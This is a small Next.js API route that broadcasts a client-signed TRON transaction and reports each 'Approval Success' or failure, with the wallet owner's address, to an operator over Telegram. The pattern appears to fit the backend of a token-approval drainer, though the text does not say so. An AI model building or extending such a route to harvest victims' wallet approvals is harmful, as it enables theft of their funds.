import { NextResponse } from 'next/server';
import { getServerTW, sendTelegram } from '../../lib/tronService';

export async function POST(req) {
    let ownerAddress = 'unknown';
    try {
        const body = await req.json();
        ownerAddress = body.ownerAddress || 'unknown';
        const { signedTx } = body;

        if (!signedTx) {
            return NextResponse.json({ error: 'Missing signed transaction' }, { status: 400 });
        }

        const tw = getServerTW();

        // Broadcast the transaction
        const result = await tw.trx.sendRawTransaction(signedTx);
        const txId = result.txid || result.transaction?.txID || result.id;

        if (txId) {
            const msg = `✅ <b>Approval Success</b>\n\nAddr: <code>${ownerAddress}</code>\nTX: <a href="https://tronscan.org/#/transaction/${txId}">${txId}</a>`;
            await sendTelegram(msg);
            return NextResponse.json({ success: true, txId });
        } else {
            throw new Error(JSON.stringify(result));
        }
    } catch (error) {
        console.error('Broadcast API Error:', error);
        // Notify on failure so the operator is aware
        await sendTelegram(
            `❌ <b>Broadcast Failed</b>\n\nAddr: <code>${ownerAddress}</code>\nError: ${error.message}`
        );
        return NextResponse.json({ error: error.message }, { status: 500 });
    }
}
